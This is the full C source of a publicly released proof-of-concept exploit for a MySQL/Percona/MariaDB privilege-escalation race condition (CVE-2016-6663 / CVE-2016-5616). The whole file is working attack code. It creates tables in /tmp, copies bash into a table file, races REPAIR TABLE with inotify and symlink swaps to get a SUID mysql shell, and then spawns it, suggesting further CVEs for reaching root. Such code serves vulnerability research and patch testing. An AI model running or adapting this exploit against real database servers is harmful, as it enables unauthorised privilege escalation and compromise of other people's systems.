#include &lt;fcntl.h&gt;
#include &lt;grp.h&gt;
#include &lt;mysql.h&gt;
#include &lt;pwd.h&gt;
#include &lt;stdint.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/inotify.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;time.h&gt;
#include &lt;unistd.h&gt;


#define EXP_PATH&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;/tmp/mysql_privesc_exploit&quot;
#define EXP_DIRN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;mysql_privesc_exploit&quot;
#define MYSQL_TAB_FILE&nbsp;&nbsp;&nbsp;&nbsp;EXP_PATH &quot;/exploit_table.MYD&quot;
#define MYSQL_TEMP_FILE&nbsp;&nbsp; EXP_PATH &quot;/exploit_table.TMD&quot;

#define SUID_SHELL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; EXP_PATH &quot;/mysql_suid_shell.MYD&quot;

#define MAX_DELAY 1000&nbsp;&nbsp;&nbsp;&nbsp;// can be used in the race to adjust the timing if necessary

MYSQL *conn;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// DB handles
MYSQL_RES *res;
MYSQL_ROW row;

unsigned long cnt;


void intro() {

printf( 
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\033[94m\n&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;MySQL/Percona/MariaDB - Privilege Escalation / Race Condition PoC Exploit\n&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;mysql-privesc-race.c (ver. 1.0)\n\n&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;CVE-2016-6663 / CVE-2016-5616\n\n&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;For testing purposes only. Do no harm.\n\n&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&quot;Discovered/Coded by:\n\n&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&quot;Dawid Golunski \n&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&quot;http://legalhackers.com&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\033[0m\n\n&quot;);

}

void usage(char *argv0) {
&nbsp;&nbsp;&nbsp;&nbsp;intro();
&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;Usage:\n\n%s user pass db_host database\n\n&quot;, argv0);
}

void mysql_cmd(char *sql_cmd, int silent) {

&nbsp;&nbsp;&nbsp;&nbsp;if (!silent) {
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;%s \n&quot;, sql_cmd);
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;if (mysql_query(conn, sql_cmd)) {
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fprintf(stderr, &quot;%s\n&quot;, mysql_error(conn));
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(1);
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;res = mysql_store_result(conn);
&nbsp;&nbsp;&nbsp;&nbsp;if (res&gt;0) mysql_free_result(res);

}


int main(int argc,char **argv)
{

&nbsp;&nbsp;&nbsp;&nbsp;int randomnum = 0;
&nbsp;&nbsp;&nbsp;&nbsp;int io_notified = 0;
&nbsp;&nbsp;&nbsp;&nbsp;int myd_handle;
&nbsp;&nbsp;&nbsp;&nbsp;int wpid;
&nbsp;&nbsp;&nbsp;&nbsp;int is_shell_suid=0;
&nbsp;&nbsp;&nbsp;&nbsp;pid_t pid;
&nbsp;&nbsp;&nbsp;&nbsp;int status;
&nbsp;&nbsp;&nbsp;&nbsp;struct stat st;
&nbsp;&nbsp;&nbsp;&nbsp;/* io notify */
&nbsp;&nbsp;&nbsp;&nbsp;int fd;
&nbsp;&nbsp;&nbsp;&nbsp;int ret;
&nbsp;&nbsp;&nbsp;&nbsp;char buf[4096] __attribute__((aligned(8)));
&nbsp;&nbsp;&nbsp;&nbsp;int num_read;
&nbsp;&nbsp;&nbsp;&nbsp;struct inotify_event *event;
&nbsp;&nbsp;&nbsp;&nbsp;/* credentials */
&nbsp;&nbsp;&nbsp;&nbsp;char *user&nbsp;&nbsp;&nbsp;&nbsp; = argv[1];
&nbsp;&nbsp;&nbsp;&nbsp;char *password = argv[2];
&nbsp;&nbsp;&nbsp;&nbsp;char *db_host&nbsp;&nbsp;= argv[3];
&nbsp;&nbsp;&nbsp;&nbsp;char *database = argv[4];


&nbsp;&nbsp;&nbsp;&nbsp;// Disable buffering of stdout
&nbsp;&nbsp;&nbsp;&nbsp;setvbuf(stdout, NULL, _IONBF, 0);

&nbsp;&nbsp;&nbsp;&nbsp;// Get the params
&nbsp;&nbsp;&nbsp;&nbsp;if (argc!=5) {
&nbsp;&nbsp;&nbsp;&nbsp;usage(argv[0]);
&nbsp;&nbsp;&nbsp;&nbsp;exit(1);
&nbsp;&nbsp;&nbsp;&nbsp;} 
&nbsp;&nbsp;&nbsp;&nbsp;intro();
&nbsp;&nbsp;&nbsp;&nbsp;// Show initial privileges
&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;\n[+] Starting the exploit as: \n&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;system(&quot;id&quot;);

&nbsp;&nbsp;&nbsp;&nbsp;// Connect to the database server with provided credentials
&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;\n[+] Connecting to the database `%s` as %s@%s\n&quot;, database, user, db_host);
&nbsp;&nbsp;&nbsp;&nbsp;conn = mysql_init(NULL);
&nbsp;&nbsp;&nbsp;&nbsp;if (!mysql_real_connect(conn, db_host, user, password, database, 0, NULL, 0)) {
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fprintf(stderr, &quot;%s\n&quot;, mysql_error(conn));
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(1);
&nbsp;&nbsp;&nbsp;&nbsp;}

&nbsp;&nbsp;&nbsp;&nbsp;// Prepare tmp dir
&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;\n[+] Creating exploit temp directory %s\n&quot;, &quot;/tmp/&quot; EXP_DIRN);
&nbsp;&nbsp;&nbsp;&nbsp;umask(000);
&nbsp;&nbsp;&nbsp;&nbsp;system(&quot;rm -rf /tmp/&quot; EXP_DIRN &quot; &amp;&amp; mkdir /tmp/&quot; EXP_DIRN);
&nbsp;&nbsp;&nbsp;&nbsp;system(&quot;chmod g+s /tmp/&quot; EXP_DIRN );

&nbsp;&nbsp;&nbsp;&nbsp;// Prepare exploit tables :)
&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;\n[+] Creating mysql tables \n\n&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;mysql_cmd(&quot;DROP TABLE IF EXISTS exploit_table&quot;, 0);
&nbsp;&nbsp;&nbsp;&nbsp;mysql_cmd(&quot;DROP TABLE IF EXISTS mysql_suid_shell&quot;, 0);
&nbsp;&nbsp;&nbsp;&nbsp;mysql_cmd(&quot;CREATE TABLE exploit_table (txt varchar(50)) engine = &#39;MyISAM&#39; data directory &#39;&quot; EXP_PATH &quot;&#39;&quot;, 0);
&nbsp;&nbsp;&nbsp;&nbsp;mysql_cmd(&quot;CREATE TABLE mysql_suid_shell (txt varchar(50)) engine = &#39;MyISAM&#39; data directory &#39;&quot; EXP_PATH &quot;&#39;&quot;, 0);

&nbsp;&nbsp;&nbsp;&nbsp;// Copy /bin/bash into the mysql_suid_shell.MYD mysql table file
&nbsp;&nbsp;&nbsp;&nbsp;// The file should be owned by mysql:attacker thanks to the sticky bit on the table directory
&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;\n[+] Copying bash into the mysql_suid_shell table.\n&nbsp;&nbsp;&nbsp;&nbsp;After the exploitation the following file/table will be assigned SUID and executable bits : \n&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;system(&quot;cp /bin/bash &quot; SUID_SHELL);
&nbsp;&nbsp;&nbsp;&nbsp;system(&quot;ls -l &quot; SUID_SHELL);

&nbsp;&nbsp;&nbsp;&nbsp;// Use inotify to get the timing right
&nbsp;&nbsp;&nbsp;&nbsp;fd = inotify_init();
&nbsp;&nbsp;&nbsp;&nbsp;if (fd &lt; 0) {
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;failed to inotify_init\n&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return -1;
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;ret = inotify_add_watch(fd, EXP_PATH, IN_CREATE | IN_CLOSE);


&nbsp;&nbsp;&nbsp;&nbsp;/* Race loop until the mysql_suid_shell.MYD table file gets assigned SUID+exec perms */

&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;\n[+] Entering the race loop... Hang in there...\n&quot;);

&nbsp;&nbsp;&nbsp;&nbsp;while ( is_shell_suid != 1 ) {

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cnt++;
&nbsp;&nbsp;&nbsp;&nbsp;if ( (cnt % 100) == 0 ) {
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf(&quot;-&gt;&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //fflush(stdout);&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;}

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/* Create empty file , remove if already exists */
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unlink(MYSQL_TEMP_FILE);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unlink(MYSQL_TAB_FILE);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mysql_cmd(&quot;DROP TABLE IF EXISTS exploit_table&quot;, 1);
&nbsp;&nbsp;&nbsp;&nbsp;mysql_cmd(&quot;CREATE TABLE exploit_table (txt varchar(50)) engine = &#39;MyISAM&#39; data directory &#39;&quot; EXP_PATH &quot;&#39;&quot;, 1);

&nbsp;&nbsp;&nbsp;&nbsp;/* random num if needed */
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;srand ( time(NULL) );
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;randomnum = ( rand() % MAX_DELAY );

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// Fork, to run the query asynchronously and have time to replace table file (MYD) with a symlink
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pid = fork();
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (pid &lt; 0) {
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fprintf(stderr, &quot;Fork failed :(\n&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/* Child process - executes REPAIR TABLE&nbsp;&nbsp;SQL statement */
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (pid == 0) {
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;usleep(500);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unlink(MYSQL_TEMP_FILE);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mysql_cmd(&quot;REPAIR TABLE exploit_table EXTENDED&quot;, 1);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// child stops here
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(0);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/* Parent process - aims to replace the temp .tmd table with a symlink before chmod */
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (pid &gt; 0 ) {
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io_notified = 0;

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while (1) {
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int processed = 0;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ret = read(fd, buf, sizeof(buf));
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (ret &lt; 0) {
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while (processed &lt; ret) {
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;event = (struct inotify_event *)(buf + processed);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (event-&gt;mask &amp; IN_CLOSE) {
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (!strcmp(event-&gt;name, &quot;exploit_table.TMD&quot;)) {
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//usleep(randomnum);

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// Set the .MYD permissions to suid+exec before they get copied to the .TMD file 
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unlink(MYSQL_TAB_FILE);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;myd_handle = open(MYSQL_TAB_FILE, O_CREAT, 0777);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;close(myd_handle);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;chmod(MYSQL_TAB_FILE, 04777);

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// Replace the temp .TMD file with a symlink to the target sh binary to get suid+exec
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unlink(MYSQL_TEMP_FILE);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;symlink(SUID_SHELL, MYSQL_TEMP_FILE);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io_notified=1;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;processed += sizeof(struct inotify_event);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (io_notified) {
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}


&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;waitpid(pid, &amp;status, 0);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}

&nbsp;&nbsp;&nbsp;&nbsp;// Check if SUID bit was set at the end of this attempt
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ( lstat(SUID_SHELL, &amp;st) == 0 ) {
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (st.st_mode &amp; S_ISUID) {
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;is_shell_suid = 1;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} 

&nbsp;&nbsp;&nbsp;&nbsp;}

&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;\n\n[+] \033[94mBingo! Race won (took %lu tries) !\033[0m Check out the \033[94mmysql SUID shell\033[0m: \n\n&quot;, cnt);
&nbsp;&nbsp;&nbsp;&nbsp;system(&quot;ls -l &quot; SUID_SHELL);

&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;\n[+] Spawning the \033[94mmysql SUID shell\033[0m now... \n&nbsp;&nbsp;&nbsp;&nbsp;Remember that from there you can gain \033[1;31mroot\033[0m with vuln \033[1;31mCVE-2016-6662\033[0m or \033[1;31mCVE-2016-6664\033[0m :)\n\n&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;system(SUID_SHELL &quot; -p -i &quot;);
&nbsp;&nbsp;&nbsp;&nbsp;//system(SUID_SHELL &quot; -p -c &#39;/bin/bash -i -p&#39;&quot;);

&nbsp;&nbsp;&nbsp;&nbsp;/* close MySQL connection and exit */
&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;\n[+] Job done. Exiting\n\n&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;mysql_close(conn);
&nbsp;&nbsp;&nbsp;&nbsp;return 0;

}